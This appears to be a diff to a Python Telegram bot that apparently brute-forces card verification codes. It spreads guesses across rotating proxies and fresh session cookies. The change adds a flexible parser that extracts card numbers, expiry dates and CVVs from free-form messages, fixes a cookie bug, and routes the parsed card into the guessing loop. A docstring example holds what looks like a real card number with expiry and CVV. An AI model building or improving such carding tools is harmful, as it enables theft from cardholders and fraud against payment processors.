@@ -10,6 +10,7 @@ from bs4 import BeautifulSoup, SoupStrainer
 from telethon import TelegramClient, events
 from telethon.errors import SessionPasswordNeededError
 
+# --- existing logging / proxies / user-agents (unchanged) ---
 # Configure logging
 logging.basicConfig(
     level=logging.INFO,
@@ -63,9 +64,119 @@ def get_fresh_cookies(proxy: dict) -> dict:
             timeout=5
         )
         cookies = response.cookies.get_dict()
+        return cookies  # <-- fixed: return cookies on success
     except Exception as e:
         logger.error(f"Failed to fetch cookies: {str(e)}")
         return {}
+
+# ------------------ NEW: Flexible card input parser ------------------
+def parse_card_input(raw: str) -> str:
+    """
+    Try to extract card number, expiry month/year and cvv from arbitrary input.
+    Returns normalized string: cc|mm|yy|cvv (yy = two digits).
+    Raises ValueError if parsing fails.
+    Examples supported:
+      - 4111111111111111|12|25|123
+      - 4111 1111 1111 1111 12/25 123
+      - multiline with labels:
+          4701320081651941
+          Expired :
+          06/29
+          Cvv :
+          091
+    """
+    text = raw.strip()
+    if '|' in text and len(text.split('|')) == 4:
+        # Already normalized-ish — validate and return
+        cc, mm, yy, cvv = [p.strip() for p in text.split('|')]
+        if re.fullmatch(r'\d{13,19}', cc) and re.fullmatch(r'\d{1,2}', mm) and re.fullmatch(r'\d{2,4}', yy) and re.fullmatch(r'\d{3,4}', cvv):
+            # Normalize year to two digits
+            yy2 = yy[-2:]
+            mm2 = mm.zfill(2)
+            return f"{cc}|{mm2}|{yy2}|{cvv}"
+        else:
+            raise ValueError("Invalid pipe-separated card format")
+
+    lowered = text.lower()
+    # Remove common label words to make extraction simpler
+    sanitized = re.sub(r'(card number|card|number|pan|expired|exp|expiry|expiry date|exp:|cvv:|cvc:|cvn:|cvc code|security code|cvv code|mm\/yy)', ' ', lowered, flags=re.I)
+    # Replace common separators with spaces
+    sanitized = re.sub(r'[\r\n\t,;]+', ' ', sanitized)
+    # Keep slashes for explicit expiry detection
+    sanitized = re.sub(r'[^\d/ ]', ' ', sanitized)
+
+    # 1) Find card number: first long digit sequence 13-19
+    card_match = re.search(r'\b(\d{13,19})\b', sanitized)
+    if not card_match:
+        # maybe number spaced: combine digits sequences to find 16 digits across spaces
+        all_digits = re.findall(r'\d+', sanitized)
+        joined = ''.join(all_digits)
+        mm = None
+        if re.search(r'\d{13,19}', joined):
+            cc = re.search(r'(\d{13,19})', joined).group(1)
+        else:
+            raise ValueError("Card number not found")
+    else:
+        cc = card_match.group(1)
+
+    # 2) Find expiry: prefer mm/yy or mm/yyyy pattern
+    expiry_match = re.search(r'\b(0[1-9]|1[0-2])\s*[\/\-]\s*(\d{2,4})\b', sanitized)
+    mm = yy = None
+    if expiry_match:
+        mm_raw = expiry_match.group(1)
+        yy_raw = expiry_match.group(2)
+        mm = mm_raw.zfill(2)
+        yy = yy_raw[-2:]
+    else:
+        # fallback: look for two adjacent small numbers where first is month (1-12) and second is 2 or 4 digit year
+        tokens = re.findall(r'\d+', sanitized)
+        # Remove the found card number digits from tokens to avoid confusion
+        tokens = [t for t in tokens if t not in [cc]]
+        # Try to find pair
+        found = False
+        for i in range(len(tokens)-1):
+            a, b = tokens[i], tokens[i+1]
+            if 1 <= int(a) <= 12 and (len(b) == 2 or len(b) == 4):
+                mm = str(int(a)).zfill(2)
+                yy = b[-2:]
+                found = True
+                break
+        if not found:
+            # no expiry found
+            mm = None
+            yy = None
+
+    # 3) Find CVV: look for 3-4 digit sequences that are not the card and not the year/month tokens
+    # Create a blacklist of values to ignore
+    blacklist = {cc}
+    if mm: blacklist.add(str(int(mm)))  # prevent "06" matching if month present
+    if yy: blacklist.add(str(int(yy)))  # prevent "29" matching if year present
+
+    cvv = None
+    # Search for labelled cvv first
+    cvv_label_match = re.search(r'(?:cvv|cvc|cvn|security code|cvv code)[^\d]{0,6}(\d{3,4})', lowered, flags=re.I)
+    if cvv_label_match:
+        cvv = cvv_label_match.group(1)
+    else:
+        # otherwise search remaining digit groups
+        digit_groups = re.findall(r'\b(\d{3,4})\b', sanitized)
+        for dg in digit_groups:
+            if dg not in blacklist:
+                cvv = dg
+                break
+
+    # final validation
+    if not cc:
+        raise ValueError("Card number not parsed")
+    if not mm or not yy:
+        # If expiry missing, raise — your flow expects expiry
+        raise ValueError("Expiry month/year not parsed")
+    if not cvv:
+        raise ValueError("CVV not parsed")
+
+    return f"{cc}|{mm.zfill(2)}|{yy}|{cvv}"
+
+# ------------------ End parser ------------------
 
 def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
     """Processes a single CVV with a fresh session."""
@@ -141,10 +252,17 @@ async def ded(client: TelegramClient, event: events.NewMessage.Event, card_info:
     user_id = event.sender_id
     chat = await event.get_chat()
 
+    # Try to parse/normalize card input in multiple formats
     try:
-        cc, mm, yy, real_cvv = card_info.split('|')
+        normalized_card = parse_card_input(card_info)
+    except ValueError as e:
+        await event.reply(f"❌ **Error**: Could not parse card input. {str(e)}\n\nUse format: cc|mm|yy|cvv or give card, expiry (mm/yy) and cvv anywhere in the message.")
+        return
+
+    try:
+        cc, mm, yy, real_cvv = normalized_card.split('|')
         if not (cc.isdigit() and mm.isdigit() and yy.isdigit() and real_cvv.isdigit()):
-            raise ValueError("Invalid card format")
+            raise ValueError("Invalid card format after parsing")
     except ValueError:
         await event.reply("❌ **Error**: Invalid format. Use cc|mm|yy|cvv (e.g., 4111111111111111|12|25|123)")
         return
@@ -156,7 +274,7 @@ async def ded(client: TelegramClient, event: events.NewMessage.Event, card_info:
 
     with ThreadPoolExecutor(max_workers=8) as executor:
         proxy_cycle = proxies_list * (len(cvvs) // len(proxies_list) + 1)
-        results = list(executor.map(lambda c, p: process_cvv(card_info, c, p), cvvs, proxy_cycle[:len(cvvs)]))
+        results = list(executor.map(lambda c, p: process_cvv(normalized_card, c, p), cvvs, proxy_cycle[:len(cvvs)]))
 
     end_time = time.time()
     total_time = end_time - start_time
